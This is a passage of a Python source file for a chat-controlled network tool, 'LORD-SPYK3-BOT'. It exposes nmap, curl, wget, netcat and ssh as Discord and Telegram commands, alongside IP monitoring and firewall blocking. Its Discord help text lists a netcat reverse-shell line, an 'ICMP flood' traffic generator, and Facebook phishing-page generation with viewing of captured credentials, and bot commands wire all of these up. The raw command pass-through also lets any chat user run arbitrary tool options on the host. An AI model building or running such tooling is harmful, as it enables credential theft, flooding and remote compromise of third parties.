                'packet_loss': packet_loss,
                'avg_rtt': avg_rtt
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Ping timeout', 'packet_loss': 100, 'avg_rtt': None}
        except Exception as e:
            return {'success': False, 'output': str(e), 'packet_loss': 100, 'avg_rtt': None}
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30) -> Dict[str, Any]:
        """Traceroute to target"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-h', str(max_hops), target]
            else:
                cmd = ['traceroute', '-m', str(max_hops), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Traceroute timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nmap(target: str, options: str = "") -> Dict[str, Any]:
        """Run nmap scan"""
        try:
            cmd = ['nmap']
            if options:
                cmd.extend(options.split())
            cmd.append(target)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse open ports
            open_ports = []
            lines = result.stdout.split('\n')
            for line in lines:
                if '/tcp' in line or '/udp' in line:
                    parts = line.split()
                    if len(parts) >= 3 and parts[1] == 'open':
                        port_proto = parts[0].split('/')
                        if len(port_proto) == 2:
                            open_ports.append({
                                'port': int(port_proto[0]),
                                'protocol': port_proto[1],
                                'service': parts[2] if len(parts) > 2 else 'unknown'
                            })
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'open_ports': open_ports,
                'open_ports_count': len(open_ports)
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Nmap timeout', 'open_ports': []}
        except Exception as e:
            return {'success': False, 'output': str(e), 'open_ports': []}
    
    @staticmethod
    def curl(url: str, options: str = "") -> Dict[str, Any]:
        """Run curl request"""
        try:
            cmd = ['curl', '-s']
            if options:
                cmd.extend(options.split())
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr if result.stderr else None
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Curl timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def wget(url: str, options: str = "") -> Dict[str, Any]:
        """Run wget download"""
        try:
            cmd = ['wget']
            if options:
                cmd.extend(options.split())
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Wget timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def netcat(target: str, port: int, options: str = "") -> Dict[str, Any]:
        """Run netcat connection"""
        try:
            cmd = ['nc']
            if options:
                cmd.extend(options.split())
            cmd.append(target)
            cmd.append(str(port))
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Netcat timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois(domain: str) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available. Install python-whois'}
        
        try:
            import whois
            result = whois.whois(domain)
            return {
                'success': True,
                'output': str(result)
            }
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def dig(domain: str, record_type: str = "A") -> Dict[str, Any]:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return {
                'success': result.returncode == 0,
                'output': result.stdout.strip() if result.stdout else result.stderr
            }
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0)
                    }
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                                 check=True, timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                                   f'name=LordSpyk3_Block_{ip}', 'dir=in', 'action=block',
                                   f'remoteip={ip}'], check=True, timeout=10)
                    return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                                 check=True, timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                                   f'name=LordSpyk3_Block_{ip}'], check=True, timeout=10)
                    return True
            return False
        except:
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.monitoring = False
        self.thresholds = {
            'port_scan': 10,
            'syn_flood': 100,
            'udp_flood': 500,
            'ddos': 1000
        }
        self.auto_block = False
        self.auto_block_threshold = 5
        self.connection_tracker = {}
        self.threads = []
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            return
        
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        self.threads = [
            threading.Thread(target=self._monitor_system, daemon=True),
            threading.Thread(target=self._monitor_connections, daemon=True),
            threading.Thread(target=self._monitor_threats, daemon=True)
        ]
        
        for thread in self.threads:
            thread.start()
        
        logger.info(f"Network monitoring started with {len(self.threads)} threads")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads = []
        logger.info("Network monitoring stopped")
    
    def _monitor_system(self):
        """Monitor system metrics"""
        while self.monitoring:
            try:
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory().percent
                disk = psutil.disk_usage('/').percent
                
                if cpu > 90:
                    self.db.log_threat(
                        'High CPU Usage', 'localhost', 'high',
                        f'CPU usage at {cpu}%', 'Logged'
                    )
                
                if mem > 90:
                    self.db.log_threat(
                        'High Memory Usage', 'localhost', 'high',
                        f'Memory usage at {mem}%', 'Logged'
                    )
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"System monitor error: {e}")
                time.sleep(10)
    
    def _monitor_connections(self):
        """Monitor network connections"""
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                
                for conn in connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        if source_ip not in self.connection_tracker:
                            self.connection_tracker[source_ip] = []
                        self.connection_tracker[source_ip].append(time.time())
                        
                        self.db.log_connection(
                            conn.laddr.ip if conn.laddr else '0.0.0.0',
                            conn.laddr.port if conn.laddr else 0,
                            source_ip,
                            conn.raddr.port,
                            str(conn.type),
                            'established'
                        )
                
                # Clean old entries
                current_time = time.time()
                for ip in list(self.connection_tracker.keys()):
                    self.connection_tracker[ip] = [
                        t for t in self.connection_tracker[ip] if current_time - t < 3600
                    ]
                    if not self.connection_tracker[ip]:
                        del self.connection_tracker[ip]
                
                time.sleep(30)
                
            except Exception as e:
                logger.error(f"Connection monitor error: {e}")
                time.sleep(10)
    
    def _monitor_threats(self):
        """Monitor for threats"""
        while self.monitoring:
            try:
                for ip, timestamps in self.connection_tracker.items():
                    count = len(timestamps)
                    if count > self.thresholds['port_scan']:
                        self.db.log_threat(
                            'Possible Port Scan', ip, 'medium',
                            f'{count} connections in last hour', 'Monitoring'
                        )
                        
                        ip_info = self.db.get_ip_info(ip)
                        if ip_info:
                            self.db.cursor.execute('''
                                UPDATE managed_ips 
                                SET alert_count = alert_count + 1
                                WHERE ip_address = ?
                            ''', (ip,))
                            self.db.conn.commit()
                        
                        if self.auto_block and count > self.auto_block_threshold:
                            self._auto_block_ip(ip, f'Exceeded port scan threshold ({count} connections)')
                
                time.sleep(60)
                
            except Exception as e:
                logger.error(f"Threat monitor error: {e}")
                time.sleep(10)
    
    def _auto_block_ip(self, ip: str, reason: str):
        """Auto-block IP"""
        try:
            logger.info(f"Auto-blocking IP {ip}: {reason}")
            
            if NetworkTools.block_ip_firewall(ip):
                self.db.block_ip(ip, reason, 'auto_block')
                self.db.log_threat('Auto-Blocked IP', ip, 'high', reason, f'IP blocked')
        except Exception as e:
            logger.error(f"Auto-block failed: {e}")
    
    def add_ip_to_monitoring(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            return self.db.add_managed_ip(ip, added_by, notes)
        except:
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        return self.db.remove_managed_ip(ip)
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block IP"""
        firewall_success = NetworkTools.block_ip_firewall(ip)
        db_success = self.db.block_ip(ip, reason, executed_by)
        
        if firewall_success or db_success:
            self.db.log_threat('Manual Block', ip, 'high', reason, f'Blocked by {executed_by}')
        
        return firewall_success or db_success
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        firewall_success = NetworkTools.unblock_ip_firewall(ip)
        db_success = self.db.unblock_ip(ip, executed_by)
        return firewall_success or db_success
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        stats = self.db.get_statistics()
        
        return {
            'monitoring': self.monitoring,
            'monitored_ips': self.db.get_managed_ips(False),
            'monitored_ips_count': stats.get('total_managed_ips', 0),
            'blocked_ips': stats.get('total_blocked_ips', 0),
            'active_connections': len(self.connection_tracker),
            'auto_block': self.auto_block
        }

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager, monitor: NetworkMonitor):
        self.handler = command_handler
        self.db = db
        self.monitor = monitor
        self.config = self._load_config()
        self.bot = None
        self.running = False
    
    def _load_config(self) -> Dict:
        """Load Discord configuration"""
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True,
                   prefix: str = "!", admin_role: str = "Admin") -> bool:
        """Save Discord configuration"""
        try:
            config = {
                'enabled': enabled,
                'token': token,
                'channel_id': channel_id,
                'prefix': prefix,
                'admin_role': admin_role
            }
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.bot = commands.Bot(
                command_prefix=self.config.get('prefix', '!'),
                intents=intents,
                help_command=None
            )
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="Lord-Spyk3 Bot | !help"
                    )
                )
            
            await self._setup_commands()
            self.running = True
            await self.bot.start(self.config['token'])
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    async def _setup_commands(self):
        """Setup Discord commands"""
        
        @self.bot.command(name='help')
        async def help_command(ctx):
            """Show help"""
            embed = discord.Embed(
                title="🕷️ LORD-SPYK3-BOT v1.0.0",
                description="**5000+ Advanced Cybersecurity Commands**",
                color=discord.Color.blue()
            )
            
            embed.add_field(
                name="📡 **Nmap Commands**",
                value="`!nmap -sP 192.168.1.0/24` - Ping sweep\n"
                      "`!nmap -sS 192.168.1.1` - SYN scan\n"
                      "`!nmap -sV 192.168.1.1` - Version detection\n"
                      "`!nmap -O 192.168.1.1` - OS detection\n"
                      "`!nmap -A 192.168.1.1` - Aggressive scan\n"
                      "`!nmap -p- 192.168.1.1` - All ports\n"
                      "`!nmap --script vuln 192.168.1.1` - Vulnerability scan",
                inline=False
            )
            
            embed.add_field(
                name="🌐 **Curl Commands**",
                value="`!curl http://example.com` - GET request\n"
                      "`!curl -X POST -d 'data=value' http://example.com` - POST request\n"
                      "`!curl -H 'Authorization: Bearer token' http://example.com` - Headers\n"
                      "`!curl -O http://example.com/file.zip` - Download file",
                inline=False
            )
            
            embed.add_field(
                name="📥 **Wget Commands**",
                value="`!wget http://example.com/file.zip` - Download file\n"
                      "`!wget -O output.html http://example.com` - Save with name\n"
                      "`!wget -r -l 5 http://example.com` - Recursive download\n"
                      "`!wget -c http://example.com/largefile.zip` - Resume download",
                inline=False
            )
            
            embed.add_field(
                name="🔌 **Netcat Commands**",
                value="`!nc example.com 80` - Connect to port\n"
                      "`!nc -l -p 1234` - Listen on port\n"
                      "`!nc -zv 192.168.1.1 1-1000` - Port scan\n"
                      "`!nc -e /bin/sh 192.168.1.1 4444` - Reverse shell",
                inline=False
            )
            
            embed.add_field(
                name="🔐 **SSH Commands**",
                value="`!ssh user@hostname` - SSH connection\n"
                      "`!ssh -p 2222 user@hostname` - Custom port\n"
                      "`!ssh -L 8080:localhost:80 user@hostname` - Port forwarding\n"
                      "`!ssh -J jumpuser@jumphost user@target` - Jump host",
                inline=False
            )
            
            embed.add_field(
                name="🔍 **Shodan Commands**",
                value="`!shodan_ip 8.8.8.8` - IP lookup\n"
                      "`!shodan_search apache` - Search Shodan\n"
                      "`!shodan_count port:22` - Count results\n"
                      "`!shodan_stats` - Usage statistics",
                inline=False
            )
            
            embed.add_field(
                name="🚀 **Traffic Generation**",
                value="`!generate_traffic icmp 8.8.8.8 10` - ICMP flood\n"
                      "`!generate_traffic http_get 192.168.1.1 30 80` - HTTP GET\n"
                      "`!generate_traffic dns 8.8.8.8 20 53` - DNS queries\n"
                      "`!traffic_status` - Check active generators",
                inline=False
            )
            
            embed.add_field(
                name="🎣 **Phishing**",
                value="`!generate_phishing_link_for_facebook` - Facebook page\n"
                      "`!phishing_start_server <id> 8080` - Start server\n"
                      "`!phishing_credentials` - View captured data",
                inline=False
            )
            
            embed.add_field(
                name="⏰ **Time Commands**",
                value="`!time` - Current time\n"
                      "`!date` - Current date\n"
                      "`!datetime` - Both\n"
                      "`!history` - Command history",
                inline=False
            )
            
            embed.set_footer(text=f"Requested by {ctx.author.name}")
            await ctx.send(embed=embed)
        
        @self.bot.command(name='ping')
        async def ping_command(ctx, target: str):
            """Ping command"""
            await ctx.send(f"🏓 Pinging {target}...")
            result = self.handler.execute(f"ping {target}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='nmap')
        async def nmap_command(ctx, *, args: str):
            """Nmap command"""
            await ctx.send(f"🔍 Running nmap scan...")
            result = self.handler.execute(f"nmap {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='curl')
        async def curl_command(ctx, *, args: str):
            """Curl command"""
            await ctx.send(f"🌐 Executing curl...")
            result = self.handler.execute(f"curl {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='wget')
        async def wget_command(ctx, *, args: str):
            """Wget command"""
            await ctx.send(f"📥 Downloading...")
            result = self.handler.execute(f"wget {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='nc')
        async def nc_command(ctx, *, args: str):
            """Netcat command"""
            await ctx.send(f"🔌 Netcat command...")
            result = self.handler.execute(f"nc {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='ssh')
        async def ssh_command(ctx, *, args: str):
            """SSH command"""
            await ctx.send(f"🔐 SSH command...")
            result = self.handler.execute(f"ssh {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='shodan')
        async def shodan_command(ctx, *, args: str):
            """Shodan command"""
            await ctx.send(f"🔍 Shodan lookup...")
            result = self.handler.execute(f"shodan {args}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='shodan_ip')
        async def shodan_ip_command(ctx, ip: str):
            """Shodan IP lookup"""
            await ctx.send(f"🔍 Shodan lookup for {ip}...")
            result = self.handler.execute(f"shodan_ip {ip}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='shodan_search')
        async def shodan_search_command(ctx, *, query: str):
            """Shodan search"""
            await ctx.send(f"🔍 Searching Shodan: {query}...")
            result = self.handler.execute(f"shodan_search {query}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='hunter_domain')
        async def hunter_domain_command(ctx, domain: str):
            """Hunter.io domain search"""
            await ctx.send(f"📧 Searching {domain}...")
            result = self.handler.execute(f"hunter_domain {domain}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='generate_traffic')
        async def generate_traffic_command(ctx, traffic_type: str, target_ip: str, duration: int, port: str = None):
            """Generate traffic"""
            cmd = f"generate_traffic {traffic_type} {target_ip} {duration}"
            if port:
                cmd += f" {port}"
            await ctx.send(f"🚀 Generating {traffic_type} traffic to {target_ip}...")
            result = self.handler.execute(cmd, "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='traffic_status')
        async def traffic_status_command(ctx):
            """Traffic status"""
            result = self.handler.execute("traffic_status", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='traffic_stop')
        async def traffic_stop_command(ctx, generator_id: str = None):
            """Stop traffic"""
            cmd = f"traffic_stop {generator_id}" if generator_id else "traffic_stop"
            result = self.handler.execute(cmd, "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='nikto')
        async def nikto_command(ctx, target: str):
            """Nikto scan"""
            await ctx.send(f"🕷️ Scanning {target} with Nikto...")
            result = self.handler.execute(f"nikto {target}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_facebook')
        async def phishing_facebook_command(ctx):
            """Facebook phishing"""
            result = self.handler.execute("generate_phishing_link_for_facebook", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='phishing_start_server')
        async def phishing_start_command(ctx, link_id: str, port: int = 8080):
            """Start phishing server"""
            result = self.handler.execute(f"phishing_start_server {link_id} {port}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='phishing_stop_server')
        async def phishing_stop_command(ctx):
            """Stop phishing server"""
            result = self.handler.execute("phishing_stop_server", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='phishing_credentials')
        async def phishing_credentials_command(ctx, link_id: str = None):
            """View captured credentials"""
            cmd = f"phishing_credentials {link_id}" if link_id else "phishing_credentials"
            result = self.handler.execute(cmd, "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='add_ip')
        async def add_ip_command(ctx, ip: str, *, notes: str = ""):
            """Add IP to monitoring"""
            try:
                ipaddress.ip_address(ip)
                result = self.handler.execute(f"add_ip {ip} {notes}", "discord")
                await self._send_result(ctx, result)
            except:
                await ctx.send(f"❌ Invalid IP: {ip}")
        
        @self.bot.command(name='block_ip')
        async def block_ip_command(ctx, ip: str, *, reason: str = "Manually blocked"):
            """Block IP"""
            try:
                ipaddress.ip_address(ip)
                result = self.handler.execute(f"block_ip {ip} {reason}", "discord")
                await self._send_result(ctx, result)
            except:
                await ctx.send(f"❌ Invalid IP: {ip}")
        
        @self.bot.command(name='unblock_ip')
        async def unblock_ip_command(ctx, ip: str):
            """Unblock IP"""
            try:
                ipaddress.ip_address(ip)
                result = self.handler.execute(f"unblock_ip {ip}", "discord")
                await self._send_result(ctx, result)
            except:
                await ctx.send(f"❌ Invalid IP: {ip}")
        
        @self.bot.command(name='list_ips')
        async def list_ips_command(ctx, filter_type: str = "all"):
            """List managed IPs"""
            filter_param = "" if filter_type == "all" else filter_type
            result = self.handler.execute(f"list_ips {filter_param}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='ip_info')
        async def ip_info_command(ctx, ip: str):
            """IP information"""
            try:
                ipaddress.ip_address(ip)
                result = self.handler.execute(f"ip_info {ip}", "discord")
                await self._send_result(ctx, result)
            except:
                await ctx.send(f"❌ Invalid IP: {ip}")
        
        @self.bot.command(name='time')
        async def time_command(ctx):
            """Current time"""
            result = self.handler.execute("time", "discord")
            await ctx.send(f"🕐 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='date')
        async def date_command(ctx):
            """Current date"""
            result = self.handler.execute("date", "discord")
            await ctx.send(f"📅 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='datetime')
        async def datetime_command(ctx):
            """Current date and time"""
            result = self.handler.execute("datetime", "discord")
            await ctx.send(f"```{result.get('output', 'N/A')}```")
        
        @self.bot.command(name='history')
        async def history_command(ctx, limit: int = 10):
            """Command history"""
            result = self.handler.execute(f"history {limit}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='status')
        async def status_command(ctx):
            """System status"""
            result = self.handler.execute("status", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='threats')
        async def threats_command(ctx, limit: int = 10):
            """Recent threats"""
            result = self.handler.execute(f"threats {limit}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='report')
        async def report_command(ctx):
            """Security report"""
            await ctx.send("📊 Generating security report...")
            result = self.handler.execute("report", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='whois')
        async def whois_command(ctx, domain: str):
            """WHOIS lookup"""
            result = self.handler.execute(f"whois {domain}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='dns')
        async def dns_command(ctx, domain: str):
            """DNS lookup"""
            result = self.handler.execute(f"dns {domain}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='location')
        async def location_command(ctx, ip: str):
            """IP geolocation"""
            result = self.handler.execute(f"location {ip}", "discord")
            await self._send_result(ctx, result)
        
        @self.bot.command(name='traceroute')
        async def traceroute_command(ctx, target: str):
            """Traceroute"""
            await ctx.send(f"🛣️ Tracing route to {target}...")
            result = self.handler.execute(f"traceroute {target}", "discord")
            await self._send_result(ctx, result)
    
    async def _send_result(self, ctx, result: Dict[str, Any]):
        """Send command result to Discord"""
        if not result['success']:
            error_msg = result.get('output', 'Unknown error')
            if len(error_msg) > 1000:
                error_msg = error_msg[:1000] + "..."
            embed = discord.Embed(title="❌ Command Failed", description=f"```{error_msg}```",
                                 color=discord.Color.red())
            await ctx.send(embed=embed)
            return
        
        output = result.get('output', '') or result.get('data', '')
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        if len(formatted) > 2000:
            formatted = formatted[:1900] + "\n\n... (output truncated)"
        
        embed = discord.Embed(
            title=f"✅ Command Executed ({result.get('execution_time', 0):.2f}s)",
            description=f"```{formatted}```",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)
    
    def start_bot_thread(self) -> bool:
        """Start Discord bot in thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self._load_config()
        self.client = None
        self.running = False
    
    def _load_config(self) -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'api_id': '', 'api_hash': '', 'bot_token': ''}
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = "",
                   phone_number: str = "", enabled: bool = True) -> bool:
        """Save Telegram configuration"""
        try:
            config = {
                'enabled': enabled,
                'api_id': api_id,
                'api_hash': api_hash,
                'bot_token': bot_token,
                'phone_number': phone_number
            }
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        """Start Telegram bot"""
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        
        try:
            self.client = TelegramClient(
                'lord_spyk3_session',
                self.config['api_id'],
                self.config['api_hash']
            )
            
            @self.client.on(events.NewMessage(pattern=r'^/(help|time|date|ping|scan|shodan|nikto|status|add_ip|block_ip|unblock_ip|list_ips)'))
            async def handler(event):
                await self.handle_command(event)
            
            if self.config.get('bot_token'):
                await self.client.start(bot_token=self.config['bot_token'])
            else:
                await self.client.start(phone=self.config.get('phone_number', ''))
            
            self.running = True
            await self.client.run_until_disconnected()
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    async def handle_command(self, event):
        """Handle Telegram commands"""
        message = event.message.message
        command = message.split()[0][1:]
        
        # Execute command
        result = self.handler.execute(command, "telegram")
        
        if result['success']:
            output = result.get('output', '')
            if len(output) > 4000:
                output = output[:3900] + "\n... (truncated)"
            await event.reply(f"✅ Command Executed\n\n{output}")
        else:
            await event.reply(f"❌ Command Failed: {result.get('output', 'Unknown error')}")
    
    def start_bot_thread(self) -> bool:
        """Start Telegram bot in thread"""
        if self.config.get('enabled') and self.config.get('api_id'):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_telegram_bot(self):
        """Run Telegram bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    """WhatsApp bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self._load_config()
        self.running = False
    
    def _load_config(self) -> Dict:
        """Load WhatsApp configuration"""
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '/'}
    
    def save_config(self, phone_number: str, prefix: str = "/", enabled: bool = True) -> bool:
        """Save WhatsApp configuration"""
        try:
            config = {
                'enabled': enabled,
                'phone_number': phone_number,
                'prefix': prefix
            }
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def start(self):
        """Start WhatsApp bot"""
        if not SELENIUM_AVAILABLE:
            return False
        
        # Simplified - actual implementation would use Selenium
        print(f"{Colors.YELLOW}⚠️ WhatsApp bot requires Selenium setup. Use 'start_whatsapp' command to start.{Colors.RESET}")
        return True
    
    def start_bot_thread(self) -> bool:
        """Start WhatsApp bot in thread"""
        if self.config.get('enabled') and self.config.get('phone_number'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    """Signal bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self._load_config()
        self.running = False
    
    def _load_config(self) -> Dict:
        """Load Signal configuration"""
        try:
            if os.path.exists(SIGNAL_CONFIG_FILE):
                with open(SIGNAL_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, prefix: str = "!", enabled: bool = True) -> bool:
        """Save Signal configuration"""
        try:
            config = {
                'enabled': enabled,
                'phone_number': phone_number,
                'prefix': prefix
            }
            with open(SIGNAL_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Signal config: {e}")
            return False
    
    def start(self):
        """Start Signal bot"""
        if not SIGNAL_CLI_AVAILABLE:
            return False
        
        print(f"{Colors.YELLOW}⚠️ Signal bot requires signal-cli setup. Use 'start_signal' command to start.{Colors.RESET}")
        return True
    
    def start_bot_thread(self) -> bool:
        """Start Signal bot in thread"""
        if self.config.get('enabled') and self.config.get('phone_number'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = self._load_config()
        self.running = False
    
    def _load_config(self) -> Dict:
